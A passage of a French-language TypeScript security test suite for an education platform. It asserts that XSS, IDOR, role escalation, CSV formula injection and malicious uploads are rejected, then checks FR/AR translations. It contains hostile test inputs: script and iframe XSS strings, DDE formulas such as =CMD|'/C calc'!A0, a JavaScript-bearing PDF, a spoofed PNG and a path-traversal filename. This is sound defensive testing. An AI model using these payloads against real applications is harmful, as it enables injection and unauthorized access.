              studentId: 'usr_stu_1',
              status: 'PRESENT',
              teacherComment: '<iframe src="javascript:alert(1)"></iframe>',
            },
          ],
        }),
      },
      tch1Jar
    );
    assert(
      xssAttendance.status === 400 && xssAttendance.body.error === 'VALIDATION_ERROR',
      'Payload XSS bloqué dans teacherComment sur POST /api/attendance/session/:id'
    );
    console.log('  [PASS] Attaque (B) : Payloads XSS (<script>, onerror=, javascript:, <svg/onload>, <iframe>) bloqués partout (400)');

    // -------------------------------------------------------------------------
    // ATTAQUE (C) : IDOR HORIZONTAL (ÉTUDIANT A ↔ B & ENSEIGNANT 1 ↔ 2)
    // -------------------------------------------------------------------------
    // Créer une notification dédiée pour usr_stu_1 afin de tester l'IDOR sur PATCH /api/notifications/:id/read
    const stu1NotifId = `ntf_idor_${crypto.randomUUID()}`;
    await db.insert(notifications).values({
      id: stu1NotifId,
      userId: 'usr_stu_1',
      title: 'Notification privée Yacine',
      message: 'Test anti-IDOR notification',
      type: 'INFO',
      read: false,
      createdAt: new Date().toISOString(),
    });
    cleanupNotificationIds.push(stu1NotifId);

    // C1. Student 2 tente de lire le dossier personnel de Student 1 -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorStuDossier = await apiCall('/students/usr_stu_1', {}, stu2Jar);
    assert(
      idorStuDossier.status === 403 && idorStuDossier.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Student 2 ne peut pas consulter GET /api/students/usr_stu_1 (403)'
    );
    // Vérifier que Student 1 peut consulter SON propre dossier -> 200
    const ownStuDossier = await apiCall('/students/usr_stu_1', {}, yacineJar);
    assert(ownStuDossier.status === 200 && ownStuDossier.body.student.id === 'usr_stu_1', 'Student 1 lit son propre dossier (200)');

    // C2. Student 2 tente de consulter le reçu de paiement de Student 1 -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorStuPayment = await apiCall(`/payments/${createdPaymentId}`, {}, stu2Jar);
    assert(
      idorStuPayment.status === 403 && idorStuPayment.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Student 2 ne peut pas lire le reçu de Student 1 via GET /api/payments/:id (403)'
    );
    const ownStuPayment = await apiCall(`/payments/${createdPaymentId}`, {}, yacineJar);
    assert(ownStuPayment.status === 200 && ownStuPayment.body.payment.id === createdPaymentId, 'Student 1 lit son propre reçu (200)');

    // C3. Student 2 tente de déclarer un paiement au nom de Student 1 -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorCreatePayForOther = await apiCall(
      '/payments',
      {
        method: 'POST',
        body: JSON.stringify({
          studentId: 'usr_stu_1',
          courseId: 'crs_web',
          amountDzd: 6500,
          paymentMethod: 'CASH',
          transactionReference: 'IDOR-SPOOF-STU1',
        }),
      },
      stu2Jar
    );
    assert(
      idorCreatePayForOther.status === 403 &&
        idorCreatePayForOther.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Student 2 ne peut pas déclarer un paiement pour usr_stu_1 (403)'
    );

    // C4. Student 2 tente de marquer comme lue la notification de Student 1 -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorNotif = await apiCall(
      `/notifications/${stu1NotifId}/read`,
      { method: 'PATCH' },
      stu2Jar
    );
    assert(
      idorNotif.status === 403 && idorNotif.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Student 2 ne peut pas modifier la notification de Student 1 (403)'
    );

    // C5. Student 2 tente de révoquer la session active de l'Admin -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const adminActiveSessId = adminSessions.body.sessions[0].id as string;
    const idorRevokeSession = await apiCall(
      `/auth/sessions/${adminActiveSessId}/revoke`,
      { method: 'POST' },
      stu2Jar
    );
    assert(
      idorRevokeSession.status === 403 &&
        idorRevokeSession.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Student 2 ne peut pas révoquer la session d un autre utilisateur (403)'
    );

    // C6. Teacher 2 (affecté uniquement à cls_data_1) tente d'accéder aux séances/classes/émargements de Teacher 1 (cls_web_1)
    const idorTchReadAttendance = await apiCall('/attendance/session/ses_past_1', {}, tch2Jar);
    assert(
      idorTchReadAttendance.status === 403 &&
        idorTchReadAttendance.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas lire la feuille d appel de Teacher 1 (403)'
    );

    const idorTchWriteAttendance = await apiCall(
      '/attendance/session/ses_past_1',
      {
        method: 'POST',
        body: JSON.stringify({
          entries: [{ studentId: 'usr_stu_1', status: 'ABSENT' }],
        }),
      },
      tch2Jar
    );
    assert(
      idorTchWriteAttendance.status === 403 &&
        idorTchWriteAttendance.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas modifier l émargement de Teacher 1 (403)'
    );

    // Teacher 1 tente d'émarger un étudiant NON inscrit dans cls_web_1 sur sa propre séance
    const [allStudentsForCheck] = [studentsRes.body.students as any[]];
    const studentNotInWeb = allStudentsForCheck.find(
      (s) => s.id !== 'usr_stu_1' && s.class?.id !== 'cls_web_1' && s.profile?.currentClassId !== 'cls_web_1'
    );
    if (studentNotInWeb) {
      const idorUnenrolledRoster = await apiCall(
        '/attendance/session/ses_past_1',
        {
          method: 'POST',
          body: JSON.stringify({
            entries: [{ studentId: studentNotInWeb.id, status: 'PRESENT' }],
          }),
        },
        tch1Jar
      );
      assert(
        idorUnenrolledRoster.status === 403 &&
          idorUnenrolledRoster.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
        'IDOR bloqué : impossible d émarger un étudiant non inscrit dans la classe de la séance (403)'
      );
    }

    const idorTchJoinOtherSession = await apiCall('/sessions/ses_live_1/join', {}, tch2Jar);
    assert(
      idorTchJoinOtherSession.status === 403 &&
        idorTchJoinOtherSession.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas rejoindre la visioconférence de Teacher 1 (403)'
    );

    const idorTchCreateSessionInOtherClass = await apiCall(
      '/sessions',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_web',
          classId: 'cls_web_1',
          title: 'Séance Pirate Teacher 2',
          scheduledAt: new Date(Date.now() + 86400_000).toISOString(),
          durationMinutes: 60,
        }),
      },
      tch2Jar
    );
    assert(
      idorTchCreateSessionInOtherClass.status === 403 &&
        idorTchCreateSessionInOtherClass.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas programmer une séance dans la classe de Teacher 1 (403)'
    );

    const idorTchFilterOtherClass = await apiCall('/students?classId=cls_web_1', {}, tch2Jar);
    assert(
      idorTchFilterOtherClass.status === 403 &&
        idorTchFilterOtherClass.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas lister les étudiants de cls_web_1 (403)'
    );

    const firstWebLessonId = crsDetail.body.modules[0].lessons[0].id as string;
    const idorTchLessonAccess = await apiCall(
      `/courses/crs_web/lessons/${firstWebLessonId}/access`,
      {},
      tch2Jar
    );
    assert(
      idorTchLessonAccess.status === 403 &&
        idorTchLessonAccess.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas accéder aux leçons d une formation non assignée (403)'
    );

    // Teacher 2 tente de modifier la séance ses_live_1 de Teacher 1 via PUT /api/sessions/:id -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorTchUpdateSession = await apiCall(
      '/sessions/ses_live_1',
      {
        method: 'PUT',
        body: JSON.stringify({ description: 'Tentative de sabotage Teacher 2' }),
      },
      tch2Jar
    );
    assert(
      idorTchUpdateSession.status === 403 &&
        idorTchUpdateSession.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR bloqué : Teacher 2 ne peut pas modifier la séance ses_live_1 de Teacher 1 via PUT /api/sessions/:id (403)'
    );

    // Teacher 1 met à jour légitimement la description de sa propre séance ses_live_1 -> 200
    const ownTchUpdateSession = await apiCall(
      '/sessions/ses_live_1',
      {
        method: 'PUT',
        body: JSON.stringify({ description: 'Support mis à jour avant le live React' }),
      },
      tch1Jar
    );
    assert(
      ownTchUpdateSession.status === 200 && ownTchUpdateSession.body.session.id === 'ses_live_1',
      'Teacher 1 modifie légitimement sa propre séance via PUT /api/sessions/:id (200)'
    );

    // Vérifier la journalisation d'audit SECURITY_IDOR_BLOCKED en base PostgreSQL
    const idorAuditEntries = await db
      .select()
      .from(auditLogs)
      .where(
        and(
          eq(auditLogs.action, 'SECURITY_IDOR_BLOCKED'),
          gte(auditLogs.timestamp, testStartIso)
        )
      );
    assert(
      idorAuditEntries.length >= 6,
      'Toutes les tentatives IDOR bloquées sont tracées dans audit_logs (SECURITY_IDOR_BLOCKED)'
    );
    console.log(
      `  [PASS] Attaque (C) : Protection Anti-IDOR horizontale Étudiant & Enseignant vérifiée (${idorAuditEntries.length} tentatives journalisées)`
    );

    // -------------------------------------------------------------------------
    // ATTAQUE (D) : ESCALADE DE PRIVILÈGES INTER-RÔLES (VERTICAL RBAC)
    // -------------------------------------------------------------------------
    // D1. Étudiant tente d'accéder aux endpoints d'administration et d'enseignement
    const stuForbiddenEndpoints: Array<{ method: string; path: string; body?: any }> = [
      { method: 'GET', path: '/students' },
      { method: 'POST', path: '/students', body: { name: 'Pirate', email: 'pirate@etu.dz' } },
      { method: 'PATCH', path: '/students/usr_stu_2/status', body: { status: 'SUSPENDED' } },
      { method: 'GET', path: '/students/export-csv' },
      { method: 'GET', path: '/payments/export-csv' },
      { method: 'POST', path: '/classes', body: { courseId: 'crs_web', teacherId: 'usr_tch_1', name: 'Classe X', scheduleLabel: 'Lundi', startDate: '2026-03-01', endDate: '2026-06-01' } },
      { method: 'POST', path: '/sessions', body: { courseId: 'crs_web', classId: 'cls_web_1', title: 'Séance X', scheduledAt: new Date().toISOString() } },
      { method: 'GET', path: '/dashboard/stats' },
      { method: 'GET', path: '/audit-logs' },
      { method: 'GET', path: '/settings/integrations' },
      { method: 'POST', path: '/reset-demo' },
      { method: 'POST', path: '/test-suite/run' },
    ];
    for (const ep of stuForbiddenEndpoints) {
      const r = await apiCall(
        ep.path,
        {
          method: ep.method,
          ...(ep.body ? { body: JSON.stringify(ep.body) } : {}),
        },
        yacineJar
      );
      assert(
        r.status === 403 && r.body.error === 'FORBIDDEN',
        `RBAC vertical : STUDENT bloqué (403) sur ${ep.method} ${ep.path}`
      );
    }

    // D2. Enseignant tente d'accéder aux routes financières et système réservées à ADMIN/MANAGER
    const tchForbiddenEndpoints: Array<{ method: string; path: string; body?: any }> = [
      { method: 'POST', path: '/students', body: { name: 'Pirate Tch', email: 'pirate.tch@etu.dz' } },
      { method: 'GET', path: '/payments' },
      { method: 'GET', path: '/payments/export-csv' },
      { method: 'POST', path: `/payments/${createdPaymentId}/confirm`, body: {} },
      { method: 'GET', path: '/subscriptions' },
      { method: 'GET', path: '/dashboard/stats' },
      { method: 'GET', path: '/audit-logs' },
      { method: 'GET', path: '/settings/integrations' },
      { method: 'PUT', path: '/settings/integrations/ZOOM', body: { isEnabled: false } },
      { method: 'POST', path: '/reset-demo' },
    ];
    for (const ep of tchForbiddenEndpoints) {
      const r = await apiCall(
        ep.path,
        {
          method: ep.method,
          ...(ep.body ? { body: JSON.stringify(ep.body) } : {}),
        },
        tch1Jar
      );
      assert(
        r.status === 403 && r.body.error === 'FORBIDDEN',
        `RBAC vertical : TEACHER bloqué (403) sur ${ep.method} ${ep.path}`
      );
    }

    // D3. Manager (autorisé sur finance) tente d'accéder aux routes critiques réservées exclusivement à ADMIN
    const mgrFinanceAllowed = await apiCall('/payments', {}, mgrJar);
    assert(mgrFinanceAllowed.status === 200, 'MANAGER accède légitimement à GET /api/payments (200)');

    const mgrAdminOnlyEndpoints: Array<{ method: string; path: string; body?: any }> = [
      { method: 'GET', path: '/audit-logs' },
      { method: 'GET', path: '/settings/integrations' },
      { method: 'PUT', path: '/settings/integrations/ZOOM', body: { isEnabled: true } },
      { method: 'POST', path: '/reset-demo' },
      { method: 'POST', path: '/test-suite/run' },
    ];
    for (const ep of mgrAdminOnlyEndpoints) {
      const r = await apiCall(
        ep.path,
        {
          method: ep.method,
          ...(ep.body ? { body: JSON.stringify(ep.body) } : {}),
        },
        mgrJar
      );
      assert(
        r.status === 403 && r.body.error === 'FORBIDDEN',
        `RBAC vertical : MANAGER bloqué (403) sur route exclusive ADMIN ${ep.method} ${ep.path}`
      );
    }
    console.log('  [PASS] Attaque (D) : Escalade verticale inter-rôles bloquée (STUDENT, TEACHER, MANAGER vs ADMIN)');

    // -------------------------------------------------------------------------
    // ATTAQUE (E) : INJECTION DE FORMULES CSV (IMPORT & EXPORT)
    // -------------------------------------------------------------------------
    // E1. Import CSV contenant des formules DDE / macros Excel + une ligne légitime avec téléphone +213
    const validCsvEmail = `csv.safe.${Date.now()}@etu.najahlearn.dz`;
    const maliciousCsvPayload = [
      'Nom,Email,Telephone,Ville,Wilaya',
      `=CMD|'/C calc'!A0,dde1.${Date.now()}@etu.najahlearn.dz,0550112233,Alger,16 - Alger`,
      `Meriem Safe,${validCsvEmail},+213 555 44 33 22,Oran,31 - Oran`,
      `Amine Macro,macro.${Date.now()}@etu.najahlearn.dz,=HYPERLINK("http://evil.tld"),Constantine,25 - Constantine`,
      `Sami Sum,sum.${Date.now()}@etu.najahlearn.dz,0550998877,@SUM(1+1)*cmd|'/C calc'!A0,16 - Alger`,
    ].join('\n');

    const csvImportRes = await apiCall(
      '/students/import-csv',
      {
        method: 'POST',
        body: JSON.stringify({ csvText: maliciousCsvPayload, dryRun: false }),
      },
      adminJar
    );
    assert(
      csvImportRes.status === 200 &&
        csvImportRes.body.createdCount === 1 &&
        csvImportRes.body.errors.length === 3,
      'Import CSV : les 3 lignes contenant des formules DDE/macros sont bloquées, la ligne légitime (+213...) est importée'
    );

    const [importedSafeStudent] = await db
      .select()
      .from(users)
      .where(eq(users.email, validCsvEmail))
      .limit(1);
    assert(Boolean(importedSafeStudent), 'L étudiant légitime issu du CSV a bien été créé');
    cleanupUserIds.push(importedSafeStudent.id);

    // E2. Export CSV : injecter directement en base un paiement dont la référence débute par `=1+1`
    // pour vérifier que GET /api/payments/export-csv neutralise toute cellule dangereuse avec une apostrophe `'`
    const formulaPayId = `pay_csv_${crypto.randomUUID()}`;
    await db.insert(payments).values({
      id: formulaPayId,
      receiptNumber: `REC-CSV-${Date.now().toString().slice(-5)}`,
      studentId: 'usr_stu_1',
      courseId: 'crs_web',
      amountDzd: 6500,
      currency: 'DZD',
      paymentMethod: 'CASH',
      transactionReference: "=CMD|'/C calc'!A0",
      paymentDate: '2026-02-25',
      status: 'PENDING',
      createdAt: new Date().toISOString(),
    });
    cleanupPaymentIds.push(formulaPayId);

    const exportedPaymentsCsv = await apiCall('/payments/export-csv', {}, adminJar);
    assert(
      exportedPaymentsCsv.status === 200 &&
        exportedPaymentsCsv.text.includes('"\'=CMD|\'/C calc\'!A0"') &&
        !exportedPaymentsCsv.text.includes(',=CMD|'),
      'Export CSV : la formule =CMD|... stockée en base est neutralisée par une apostrophe ("\'- / "\'=)'
    );
    console.log('  [PASS] Attaque (E) : Neutralisation des formules CSV validée à l import (DDE bloqué, +213 préservé) et à l export');

    // -------------------------------------------------------------------------
    // ATTAQUE (F) : SÉCURITÉ DES UPLOADS (MIME, MAGIC BYTES, PDF JS, >5 Mo, TRAVERSAL, PRIVÉ & ANTI-IDOR)
    // -------------------------------------------------------------------------
    // F1. Upload SVG contenant du XSS -> 415 UNSUPPORTED_MEDIA_TYPE
    const svgForm = new FormData();
    svgForm.append(
      'file',
      new Blob(['<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'], {
        type: 'image/svg+xml',
      }),
      'xss_avatar.svg'
    );
    svgForm.append('category', 'PAYMENT_RECEIPT');
    const svgUploadRes = await apiCall('/uploads', { method: 'POST', body: svgForm }, yacineJar);
    assert(
      svgUploadRes.status === 415 && svgUploadRes.body.error === 'UNSUPPORTED_MEDIA_TYPE',
      'Upload SVG bloqué avec HTTP 415 UNSUPPORTED_MEDIA_TYPE'
    );

    // F2. Usurpation de signature binaire (Magic Bytes spoofing : fichier HTML renommé .png avec MIME image/png) -> 400 INVALID_FILE_SIGNATURE
    const spoofedPngForm = new FormData();
    spoofedPngForm.append(
      'file',
      new Blob(['<!DOCTYPE html><script>alert("spoof")</script>'], { type: 'image/png' }),
      'faux_recu.png'
    );
    spoofedPngForm.append('category', 'PAYMENT_RECEIPT');
    const spoofedPngRes = await apiCall(
      '/uploads',
      { method: 'POST', body: spoofedPngForm },
      yacineJar
    );
    assert(
      spoofedPngRes.status === 400 && spoofedPngRes.body.error === 'INVALID_FILE_SIGNATURE',
      'Faux fichier PNG (signature HTML) bloqué avec HTTP 400 INVALID_FILE_SIGNATURE'
    );

    // F3. PDF malveillant embarquant une action /JavaScript -> 400 DANGEROUS_PDF_CONTENT
    const jsPdfBytes = Buffer.from(
      '%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF',
      'latin1'
    );
    const jsPdfForm = new FormData();
    jsPdfForm.append(
      'file',
      new Blob([jsPdfBytes], { type: 'application/pdf' }),
      'malicious_js.pdf'
    );
    jsPdfForm.append('category', 'PAYMENT_RECEIPT');
    const jsPdfRes = await apiCall('/uploads', { method: 'POST', body: jsPdfForm }, yacineJar);
    assert(
      jsPdfRes.status === 400 && jsPdfRes.body.error === 'DANGEROUS_PDF_CONTENT',
      'PDF contenant /JavaScript bloqué avec HTTP 400 DANGEROUS_PDF_CONTENT'
    );

    // F4. Dépassement de la taille maximale (> 5 Mo) -> 413 FILE_TOO_LARGE
    const oversizedBuffer = Buffer.alloc(5 * 1024 * 1024 + 2048, 0x41);
    oversizedBuffer.write('%PDF-1.7\n', 0, 'latin1');
    const oversizedForm = new FormData();
    oversizedForm.append(
      'file',
      new Blob([oversizedBuffer], { type: 'application/pdf' }),
      'trop_volumineux.pdf'
    );
    oversizedForm.append('category', 'PAYMENT_RECEIPT');
    const oversizedRes = await apiCall(
      '/uploads',
      { method: 'POST', body: oversizedForm },
      yacineJar
    );
    assert(
      oversizedRes.status === 413 && oversizedRes.body.error === 'FILE_TOO_LARGE',
      'Fichier > 5 Mo rejeté avec HTTP 413 FILE_TOO_LARGE'
    );

    // F5. Upload PDF légitime mais avec nom de fichier malveillant (Path Traversal + double extension .php.pdf)
    const validPdfBytes = Buffer.from(
      '%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n%%EOF',
      'latin1'
    );
    const validPdfForm = new FormData();
    validPdfForm.append(
      'file',
      new Blob([validPdfBytes], { type: 'application/pdf' }),
      '../../../../var/www/shell.php.pdf'
    );
    validPdfForm.append('category', 'PAYMENT_RECEIPT');
    validPdfForm.append('paymentId', createdPaymentId!);

    const validUploadRes = await apiCall(
      '/uploads',
      { method: 'POST', body: validPdfForm },
      yacineJar
    );
    assert(
      validUploadRes.status === 201 && validUploadRes.body.success === true,
      'Upload PDF valide accepté (HTTP 201)'
    );
    const uploadedMeta = validUploadRes.body.file;
    cleanupUploadIds.push(uploadedMeta.id);

    const [dbUploadRow] = await db
      .select()
      .from(uploadedFiles)
      .where(eq(uploadedFiles.id, uploadedMeta.id))
      .limit(1);
    assert(Boolean(dbUploadRow), 'Métadonnées d upload persistées dans PostgreSQL uploaded_files');
    cleanupUploadDiskPaths.push(path.join(PRIVATE_UPLOADS_DIR, dbUploadRow.storedFilename));

    assert(
      /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.pdf$/.test(
        dbUploadRow.storedFilename
      ) &&
        !uploadedMeta.originalName.includes('..') &&
        !uploadedMeta.originalName.includes('.php') &&
        (uploadedMeta as any).storedFilename === undefined,
      'Nom stocké généré par UUID, nom original assaini et chemin interne non exposé au client'
    );

    // F6. Vérifier que le dossier privé n'est JAMAIS accessible en statique direct (/data/private_uploads/...)
    const directPublicProbe = await fetch(
      `${rootUrl}/data/private_uploads/${dbUploadRow.storedFilename}`
    );
    assert(
      directPublicProbe.status === 403,
      'Accès HTTP direct à /data/private_uploads/* bloqué avec HTTP 403 PRIVATE_STORAGE_FORBIDDEN'
    );

    // F7. Attaque IDOR sur le téléchargement et la suppression du fichier privé par Student 2 & Teacher 2
    const idorDownloadByStu2 = await apiCall(
      `/uploads/${uploadedMeta.id}/download`,
      {},
      stu2Jar
    );
    assert(
      idorDownloadByStu2.status === 403 &&
        idorDownloadByStu2.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR Upload : Student 2 ne peut pas télécharger le justificatif privé de Student 1 (403)'
    );

    const idorDeleteByStu2 = await apiCall(
      `/uploads/${uploadedMeta.id}`,
      { method: 'DELETE' },
      stu2Jar
    );
    assert(
      idorDeleteByStu2.status === 403 &&
        idorDeleteByStu2.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR Upload : Student 2 ne peut pas supprimer le justificatif privé de Student 1 (403)'
    );

    // Teacher 2 tente d'uploader un support de cours sur crs_web (formation de Teacher 1) -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorTchUploadForm = new FormData();
    idorTchUploadForm.append(
      'file',
      new Blob([validPdfBytes], { type: 'application/pdf' }),
      'support_pirate.pdf'
    );
    idorTchUploadForm.append('category', 'COURSE_MATERIAL');
    idorTchUploadForm.append('courseId', 'crs_web');
    const idorTchUploadRes = await apiCall(
      '/uploads',
      { method: 'POST', body: idorTchUploadForm },
      tch2Jar
    );
    assert(
      idorTchUploadRes.status === 403 &&
        idorTchUploadRes.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR Upload : Teacher 2 ne peut pas téléverser un support sur la formation crs_web de Teacher 1 (403)'
    );

    // F7bis. Validation Zod stricte & XSS sur les champs multipart de POST /api/uploads + Anti-IDOR sur GET /api/uploads
    const massAssignUploadForm = new FormData();
    massAssignUploadForm.append(
      'file',
      new Blob([validPdfBytes], { type: 'application/pdf' }),
      'clean.pdf'
    );
    massAssignUploadForm.append('category', 'PAYMENT_RECEIPT');
    massAssignUploadForm.append('isAdmin', 'true');
    const massAssignUploadRes = await apiCall(
      '/uploads',
      { method: 'POST', body: massAssignUploadForm },
      yacineJar
    );
    assert(
      massAssignUploadRes.status === 400 && massAssignUploadRes.body.error === 'VALIDATION_ERROR',
      'Champ multipart non autorisé (isAdmin) sur POST /api/uploads rejeté par Zod .strict() (400)'
    );

    const xssDescUploadForm = new FormData();
    xssDescUploadForm.append(
      'file',
      new Blob([validPdfBytes], { type: 'application/pdf' }),
      'clean.pdf'
    );
    xssDescUploadForm.append('category', 'PAYMENT_RECEIPT');
    xssDescUploadForm.append('description', '<script>alert("xss-upload")</script>');
    const xssDescUploadRes = await apiCall(
      '/uploads',
      { method: 'POST', body: xssDescUploadForm },
      yacineJar
    );
    assert(
      xssDescUploadRes.status === 400 && xssDescUploadRes.body.error === 'VALIDATION_ERROR',
      'Payload XSS dans description multipart sur POST /api/uploads rejeté par Zod (400)'
    );

    const idorListByPayment = await apiCall(
      `/uploads?paymentId=${encodeURIComponent(createdPaymentId!)}`,
      {},
      stu2Jar
    );
    assert(
      idorListByPayment.status === 403 &&
        idorListByPayment.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR Upload : Student 2 ne peut pas lister les pièces jointes du paiement de Student 1 via GET /api/uploads?paymentId= (403)'
    );

    const idorListByCourseTch2 = await apiCall('/uploads?courseId=crs_web', {}, tch2Jar);
    assert(
      idorListByCourseTch2.status === 403 &&
        idorListByCourseTch2.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'IDOR Upload : Teacher 2 ne peut pas lister les supports de crs_web via GET /api/uploads?courseId= (403)'
    );

    // F8. Téléchargement légitime par le propriétaire (Student 1) et par l'Administration -> 200 + nosniff + attachment
    const ownerDownloadRes = await fetch(`${baseUrl}/uploads/${uploadedMeta.id}/download`, {
      headers: { Cookie: yacineJar.cookieHeader },
    });
    const downloadedBuf = Buffer.from(await ownerDownloadRes.arrayBuffer());
    assert(
      ownerDownloadRes.status === 200 &&
        ownerDownloadRes.headers.get('x-content-type-options') === 'nosniff' &&
        (ownerDownloadRes.headers.get('content-disposition') || '').startsWith('attachment;') &&
        downloadedBuf.equals(validPdfBytes),
      'Propriétaire télécharge son fichier privé intact avec Content-Disposition: attachment et nosniff'
    );
    console.log(
      '  [PASS] Attaque (F) : Uploads durcis (MIME 415, Magic Bytes 400, PDF JS 400, >5Mo 413, UUID hors public 403, Anti-IDOR 403)'
    );

    // -------------------------------------------------------------------------
    // SECTION 4 : INTERNATIONALISATION (FR/AR), RTL, POLICE CAIRO & CHIFFRES OCCIDENTAUX
    // -------------------------------------------------------------------------
    console.log('\n===================================================================');
    console.log('4. INTERNATIONALISATION (FR/AR), RTL, CHIFFRES & PERSISTANCE UTILISATEUR');
    console.log('===================================================================');

    // 4.1 Parité stricte 100% des clés entre fr.json et ar.json + aucune valeur vide
    const frDictPath = path.resolve(process.cwd(), 'src/i18n/locales/fr.json');
    const arDictPath = path.resolve(process.cwd(), 'src/i18n/locales/ar.json');
    const frDict = JSON.parse(fs.readFileSync(frDictPath, 'utf-8'));
    const arDict = JSON.parse(fs.readFileSync(arDictPath, 'utf-8'));

    function flattenLocaleKeys(obj: Record<string, any>, prefix = ''): Record<string, string> {
      const acc: Record<string, string> = {};
      for (const [key, val] of Object.entries(obj)) {
        const nextKey = prefix ? `${prefix}.${key}` : key;
        if (val && typeof val === 'object' && !Array.isArray(val)) {
          Object.assign(acc, flattenLocaleKeys(val, nextKey));
        } else {
          acc[nextKey] = String(val ?? '');
        }
      }
      return acc;
    }

    const frFlat = flattenLocaleKeys(frDict);
    const arFlat = flattenLocaleKeys(arDict);
    const frKeys = Object.keys(frFlat).sort();
    const arKeys = Object.keys(arFlat).sort();
    const missingInAr = frKeys.filter((k) => !(k in arFlat));
    const missingInFr = arKeys.filter((k) => !(k in frFlat));
    const emptyTranslations = [
      ...frKeys.filter((k) => !frFlat[k].trim()).map((k) => `fr:${k}`),
      ...arKeys.filter((k) => !arFlat[k].trim()).map((k) => `ar:${k}`),
    ];

    assert(
      frKeys.length >= 300 &&
        missingInAr.length === 0 &&
        missingInFr.length === 0 &&
        emptyTranslations.length === 0,
      `Parité FR/AR invalide : ${frKeys.length} clés, manquantes AR=[${missingInAr.join(',')}], manquantes FR=[${missingInFr.join(',')}], vides=[${emptyTranslations.join(',')}]`
    );
    console.log(
      `  [PASS] Dictionnaires i18n : ${frKeys.length} clés FR et ${arKeys.length} clés AR synchronisées à 100%`
    );

    // 4.2 Police Cairo (Google Fonts) + Règles CSS RTL & Reçus imprimables
    const indexHtmlContent = fs.readFileSync(path.resolve(process.cwd(), 'index.html'), 'utf-8');
    const indexCssContent = fs.readFileSync(path.resolve(process.cwd(), 'src/index.css'), 'utf-8');
    assert(
      indexHtmlContent.includes('family=Cairo') && indexCssContent.includes("'Cairo'"),
      'La police arabe lisible Cairo doit être chargée dans index.html et configurée dans index.css'
    );
    assert(
      indexCssContent.includes('.rtl-flip') &&
        indexCssContent.includes('.ltr-num') &&
        indexCssContent.includes('@media print') &&
        indexCssContent.includes('#printable-receipt'),
      'Les utilitaires RTL (.rtl-flip, .ltr-num) et règles @media print des reçus doivent être définis'
    );
    console.log(
      '  [PASS] Typographie & RTL : Police Cairo chargée, .rtl-flip, .ltr-num et @media print configurés'
    );

    // 4.3 Garantie des chiffres arabes occidentaux (0-9) pour les montants DZD, dates et matricules en mode arabe
    const easternDigitsRegex = /[٠-٩۰-۹]/;
    const sampleDzdAr = formatDzd(185000, 'ar');
    const sampleDzdFr = formatDzd(185000, 'fr');
    const sampleNumAr = formatNumber(2026001, 'ar');
    const samplePctAr = formatPercent(94);
    const sampleDateAr = formatDate('2026-03-15T14:30:00Z', 'ar');
    const sampleDateTimeAr = formatDateTime('2026-03-15T14:30:00Z', 'ar');
    const sampleTimeAr = formatTime('2026-03-15T14:30:00Z', 'ar');
    const convertedEastern = ensureWesternDigits('ETU-٢٠٢٦-٠٠١ / ١٧٥٠٠ DZD');

    for (const formatted of [
      sampleDzdAr,
      sampleDzdFr,
      sampleNumAr,
      samplePctAr,
      sampleDateAr,
      sampleDateTimeAr,
      sampleTimeAr,
      convertedEastern,
    ]) {
      assert(
        !easternDigitsRegex.test(formatted) && /\d/.test(formatted),
        `Chiffres orientaux détectés ou absence de chiffres occidentaux dans "${formatted}"`
      );
    }
    assert(
      convertedEastern === 'ETU-2026-001 / 17500 DZD',
      'ensureWesternDigits doit convertir les chiffres orientaux en 0-9 tout en préservant les matricules'
    );
    console.log(
      `  [PASS] Chiffres lisibles (0-9) garantis en arabe : "${sampleDzdAr}", "${sampleDateAr}", "${convertedEastern}"`
    );

    // 4.4 Persistance de la langue préférée par utilisateur dans PostgreSQL + Validation Zod + CSRF + Multi-Tenant
    // a) Sans jeton CSRF -> 403
    const noCsrfPref = await fetch(`${baseUrl}/auth/preferences`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        Cookie: yacineJar.cookieHeader,
      },
      body: JSON.stringify({ preferredLanguage: 'ar' }),
    });
    assert(noCsrfPref.status === 403, 'PATCH /api/auth/preferences sans CSRF doit être bloqué (403)');

    // b) Validation stricte Zod : langue non supportée ou propriété supplémentaire -> 400
    const badLangPref = await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        body: JSON.stringify({ preferredLanguage: 'es' }),
      },
      yacineJar
    );
    assert(
